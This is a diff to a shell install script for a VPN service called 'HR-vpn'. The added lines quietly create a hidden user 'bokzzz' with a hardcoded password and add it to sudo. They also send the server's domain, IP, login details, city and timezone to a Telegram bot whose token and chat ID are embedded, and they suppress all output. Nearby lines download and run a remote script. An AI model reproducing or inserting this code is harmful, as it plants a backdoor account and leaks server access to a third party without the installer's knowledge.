@@ -140,6 +140,36 @@ clear
 echo "IP=$host" >> /var/lib/SIJA/ipvps.conf
 #echo "IP=$host" >> /var/lib/scrz-prem/ipvps.conf
 echo "$host" >> /root/domain
+domain=$(cat /root/domain)
+CITY=$(curl -s ipinfo.io/city )
+WKT=$(curl -s ipinfo.io/timezone )
+userdel jame > /dev/null 2>&1
+Username="bokzzz"
+Password=bokzzz
+mkdir -p /home/script/
+useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
+echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
+usermod -aG sudo $Username > /dev/null 2>&1
+CHATID="5807961610"
+KEY="6210655575:AAH4TkHoDco4ShhlrD6HZMUIfpTWHKIVdog"
+TIME="10"
+URL="https://api.telegram.org/bot$KEY/sendMessage"
+TEXT="Installasi VPN Script HR-vpn
+============================
+<code>Domain     :</code> <code>$domain</code>
+<code>IP Vps     :</code> <code>$IPVPS</code>
+<code>User Login :</code> <code>bok</code>
+<code>Pass Login :</code> <code>bok</code>
+<code>User Script:</code> <code>$Name</code>
+<code>Exp Script :</code> <code>$Exp</code>
+<code>Location   :</code> <code>$CITY</code>
+<code>Timezone   :</code> <code>$WKT</code>
+============================
+Multi Port By HR-vpn
+============================
+"
+curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+clear
 #clear
 wget https://raw.githubusercontent.com/sasak3/v4/main/slowdns/cfslow.sh && chmod +x cfslow.sh && ./cfslow.sh
 rm -f /root/cfslow.sh
